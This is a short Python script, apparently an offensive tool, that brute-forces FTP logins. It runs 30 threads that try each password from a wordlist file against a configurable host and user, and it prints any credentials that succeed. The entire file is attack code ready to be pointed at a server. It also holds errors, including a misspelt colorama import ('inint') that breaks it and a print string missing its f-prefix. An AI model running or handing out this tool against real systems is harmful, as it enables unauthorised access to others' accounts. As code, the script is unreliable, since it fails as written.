import ftplib
from threading import Thread
import queue
from colorama import inint, Fore

q = queue.Queue()

n_threads = 30
host = ''
user = ''
port = 21

def connect_ftp():
    global q
    while True:
        password = q.get()
        server = ftplib.FTP()
        print('[!] Trying: {password}')
        try:
            server.connect(host, port, timeout=5)
            server.login(user, password)
        except ftplib.error_perm:
            pass
        else:
            print(f"{Fore.GREEN}[+] Found Credentials: ")
            print(f"\tHost: {host}")
            print(f"\tUser: {user}")
            print(f'\tPassword: {password}{Fore.RESET}')

            #Clear the queue
            with q.mutex:
                q.queue.clear()
                q.all_tasks_done.notify_all()
                q.unfinished_tasks = 0
        finally:
            q.task_done()


passwords = open('wordlist.txt').read().split('\n')
print(f'[+] Passwrods to try: {len(passwords)}')

for password in passwords:
    q.put(password)
for t in range(n_threads):
    thread = Thread(target=connect_ftp)
    thread.daemon = True
    thread.start()

q.join()